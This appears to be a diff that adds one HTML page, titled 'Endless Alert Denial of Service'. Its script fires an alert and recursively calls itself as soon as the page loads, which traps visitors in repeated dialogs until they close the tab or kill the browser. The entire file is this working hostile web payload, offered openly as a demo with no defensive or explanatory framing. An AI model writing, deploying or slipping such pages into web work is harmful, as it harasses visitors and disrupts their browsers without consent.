@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Endless Alert Denial of Service</title>
+    <script>
+        // Function to create an endless alert loop
+        function endlessAlert() {
+            alert("You are trapped in an endless alert loop! Click 'OK' to continue.");
+            endlessAlert(); // Recursive call to keep creating alerts
+        }
+
+        // Start the endless alert loop when the page loads
+        window.onload = function() {
+            endlessAlert();
+        };
+    </script>
+</head>
+<body>
+    <h1>Endless Alert Demo</h1>
+    <p>Close this tab to stop the alerts, or terminate your browser process.</p>
+</body>
+</html>
